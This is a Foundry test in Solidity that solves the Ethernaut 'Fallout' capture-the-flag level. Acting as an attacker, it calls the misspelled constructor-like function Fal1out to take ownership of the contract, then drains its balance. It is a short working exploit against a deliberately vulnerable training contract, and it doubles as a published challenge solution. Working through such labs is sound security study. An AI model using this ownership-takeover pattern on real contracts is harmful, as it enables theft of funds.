pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Fallout/FalloutFactory.sol";
import "../src/core/Ethernaut.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address attacker = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FalloutFactory factory = new FalloutFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Fallout target = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // (...)
        emit log_named_address("Fallout Owner Before Attack", target.owner());

        target.Fal1out{value: 1 wei}();
        emit log_named_address("Fallout Owner After Attack", target.owner());
        assertEq(target.owner(), attacker);

        target.collectAllocations();
        assertEq(address(target).balance, 0);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////


        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
